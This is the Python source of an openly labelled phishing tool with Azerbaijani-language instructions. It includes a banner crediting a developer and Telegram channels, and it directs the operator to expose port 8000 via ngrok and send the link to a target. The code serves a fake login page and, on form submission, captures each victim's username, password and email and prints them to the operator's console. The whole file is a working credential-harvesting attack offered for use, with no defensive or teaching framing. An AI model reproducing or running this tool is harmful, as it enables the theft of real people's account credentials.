#Ne gezirsen burda???? Kodlari ogurlamaqa gelmisen???

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import os
os.system("clear")
print("""

\033[31m
   █████████             █████                        ██████████                       █████     
  ███░░░░░███           ░░███                        ░░███░░░░███                     ░░███      
 ███     ░░░  █████ ████ ░███████   ██████  ████████  ░███   ░░███  ██████   ████████  ░███ █████
░███         ░░███ ░███  ░███░░███ ███░░███░░███░░███ ░███    ░███ ░░░░░███ ░░███░░███ ░███░░███ 
░███          ░███ ░███  ░███ ░███░███████  ░███ ░░░  ░███    ░███  ███████  ░███ ░░░  ░██████░  
░░███     ███ ░███ ░███  ░███ ░███░███░░░   ░███      ░███    ███  ███░░███  ░███      ░███░░███ 
 ░░█████████  ░░███████  ████████ ░░██████  █████     ██████████  ░░████████ █████     ████ █████
  ░░░░░░░░░    ░░░░░███ ░░░░░░░░   ░░░░░░  ░░░░░     ░░░░░░░░░░    ░░░░░░░░ ░░░░░     ░░░░ ░░░░░ 
               ███ ░███                                                                          
              ░░██████                                                       <> Phising <>                 
              ░░░░░░           
                          \033[32m                   Version 0.1
                               #######################################
                               #    <>Developer By m3m3nt9m9ri<>     #
                               #                                     #
                               #  <> Aşağıdakı telegram kanallarına  #
                               #            gözləyirik <>            #
                               #                                     #
                               #######################################
                                 <>   https://t.me/cyberdarkk     <>
                                 <>   https://t.me/istiklal_team  <>
 
\033[33m
Ngrok istifadə edərək 8000 portunu dinləməyə alın və ngrokun
verdiyi url hədəfə atın

\033[32m

""")
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()

            with open('index.html', 'r', encoding='utf-8') as file:
                content = file.read()

            self.wfile.write(content.encode('utf-8'))
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/login':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                post_data = post_data.decode('utf-8')

                parsed_data = urllib.parse.parse_qs(post_data)
                username = parsed_data.get('username', [''])[0]
                password = parsed_data.get('password', [''])[0]
                email = parsed_data.get('email', [''])[0]

            
                print(f"\033[34m***İstifadəçi adı: {username}")
                print(f"\033[34m***Parol: {password}")
                print(f"\033[34m***E-mail: {email}")

                self.send_response(302)
                self.send_header('Location', '/?message=Data%20b%yadda saxanıldı!')
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()

            except Exception as e:
                self.send_error(500)

        else:
            self.send_error(404)

    def log_message(self, format, *args):
        pass
    
        
def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    print('Server başladıldı...')
    print(""" 
                                                          <> Nəticə <>
---------------------------------------------------------------------------------------------------------------------------------------------------

    """)
    httpd.serve_forever()

if __name__ == '__main__':
    run()


